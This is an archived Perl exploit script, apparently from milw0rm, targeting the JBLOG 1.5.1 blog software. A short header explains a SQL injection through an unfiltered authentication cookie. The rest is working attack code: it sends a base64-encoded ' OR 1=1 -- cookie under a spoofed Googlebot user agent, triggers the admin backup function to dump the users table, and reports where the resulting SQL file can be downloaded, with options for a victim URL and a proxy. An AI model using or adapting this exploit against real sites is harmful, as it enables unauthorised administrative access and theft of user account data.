<html><head><title>JBLOG 1.5.1 Remote SQL Table Backup Exploit</title></head><pre>#!/usr/bin/perl

=about

 VENDOR
    JBLOG 1.5.1
    (maybe earlier versions vulnerable too)
    http://www.lisijie.org

 AUTHOR
    discovered &amp; written by Ams
    ax330d [doggy] gmail [dot] com
    http://www.0x416d73.name/

 VULNERABILITY DESCRIPTION
    Both 'index.php' and 'admin.php' includes file 'common.php' which checks
    for user permission on line 81 via function 'check_user()'.
    This function is defined in file 'include/func_user.php'.
    There is another one function - 'get_cookie()' which gets cookie values.
    So, in cookies we put our evil string and further actions should be clear.

    Why we don't filter COOKIEs ?

 EXPLOIT WORK
    This exploit uses SQL-injection to create dump of users table.
    Actually, we are possible to do all administrator actions.

 REQUIREMENTS
    1. You need to know prefix, by default it is 'jblog_'.
    But there is no problem to find it out.
    2. Rights to write to 'cache/' folder.

=cut

use strict;
use warnings;

use LWP::UserAgent;
use HTTP::Request::Common;
use MIME::Base64;
use Getopt::Long;

Banner();
$| = 1;

my $expl_url;
my $prefix = 'jblog_';
my $proxy  = '';

GetOptions(
    'u=s'   =&gt; \$expl_url,
    'pre=s' =&gt; \$prefix,
    'p=s'   =&gt; \$proxy,
) or Usage();

my $spider = LWP::UserAgent-&gt;new;
$spider-&gt;agent('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
$spider-&gt;default_header( 'Cookie' =&gt; $prefix . 'authkey=' . encode_base64( &quot;1\t' OR 1=1 -- &quot; ) );
$spider-&gt;proxy(['http'], &quot;http://$proxy/&quot;) if $proxy ne '';
$spider-&gt;timeout( 30 );

Exploit( $expl_url);

sub Exploit {

    $_ = shift || Usage();
    print &quot;\n\tExploiting:\t $_&quot;;

    my ($prot , $host, $path, )
        = m{(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?};
    $prot ||= 'http';

    my $url    = &quot;$prot://$host$path&quot;;
    my $defact = 'admin.php?ac=data&amp;do=bakout&amp;dosubmit=yes&amp;sizelimit=2048';

    #   First request to prepare
    my $req = GET &quot;$url/$defact&amp;baktables%5B%5D=${prefix}user&quot;;
    my $res = $spider-&gt;request( $req );
    my ($dir, $file) = $res-&gt;content =~ /yes&amp;bakdir=(.*?)&amp;(?:.*?)&amp;filepre=(.*?)'/;

    #   Second request to dump table
    $req = GET &quot;$url/$defact&amp;bakdir=$dir&amp;step=1&amp;baktablestr=${prefix}user&amp;tableid=0&amp;start=0&amp;filepre=$file&quot;;
    $res = $spider-&gt;request( $req );

    #   Finally checking if sql backup exists
    $req = HEAD &quot;$url/cache/backup/$dir/${file}_1.sql&quot;;
    $res = $spider-&gt;request( $req );    

    if ( $res-&gt;is_success ) {
        print &quot;\n\tLooks ok, check $prot://$host${path}cache/backup/$dir/${file}_1.sql\n&quot;;
    } else {
        printf(
            &quot;\n\tFailure, server response: %s\n\tAnyway, check: %s\n&quot;,
            $res-&gt;status_line, &quot;$prot://$host${path}cache/backup/$dir/${file}_1.sql&quot;);
    }
}

sub Usage {

    print &lt;&lt;USAGE;

        Usage:
        -u     Set url of victim
            optional:
        -pre   Prefix, default 'jblog_' is used if no one mentioned
        -p     Proxy, set as ip:port

        Example:
            $0 -u=http://site.com -pre=jblog_ -p=127.0.0.1:8080

USAGE

    exit;
}

sub Banner {

    print &lt;&lt;BANNER;
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
          JBLOG 1.5.1 Perl exploit
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
BANNER

}

# milw0rm.com [2009-08-13]</pre></html>